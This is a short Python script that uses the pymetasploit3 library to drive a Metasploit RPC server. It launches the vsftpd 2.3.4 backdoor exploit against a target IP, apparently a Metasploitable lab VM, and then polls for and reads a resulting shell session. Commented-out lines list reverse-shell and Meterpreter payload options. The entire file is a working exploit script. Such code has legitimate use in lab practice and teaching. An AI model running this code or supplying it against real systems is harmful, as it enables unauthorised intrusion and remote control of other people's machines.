from pymetasploit3.msfrpc import MsfRpcClient
import time

def exploit_vsftpd(ip):
    try:
        # Connect to the Metasploit RPC server
        client = MsfRpcClient('yourpassword', ssl=False, port=55552)

        # Use the vsftpd_234_backdoor exploit module
        exploit = client.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')

        # Set the target IP
        exploit['RHOSTS'] = ip

        # Set the payload
        # payload = client.modules.use('payload', 'cmd/unix/interact')
        # payload = client.modules.use('payload', 'cmd/unix/reverse')
        # payload = client.modules.use('payload', 'linux/x86/meterpreter/reverse_tcp')

        # Execute the exploit
        result = exploit.execute(payload=exploit.payloads[0])
        print(f"Successfully exploited {ip}")
        print(f"Exploit result: {result}")
        # Retry checking for sessions
        for _ in range(10):  # Check up to 10 times
            sessions = client.sessions.list
            if sessions:
                print(f"Successfully exploited {ip}")
                session_id = list(sessions.keys())[0]
                session = client.sessions.session(session_id)
                print("Session created:")
                print(session.read())
                break
            else:
                print("No active sessions found, retrying...")
                # time.sleep(5)  # Wait before retrying
    except Exception as e:
        print(f"An error occurred: {e}")


if __name__ == "__main__":
    target_ip = '10.0.2.6'  # Replace with the IP of your Metasploitable VM
    exploit_vsftpd(target_ip)
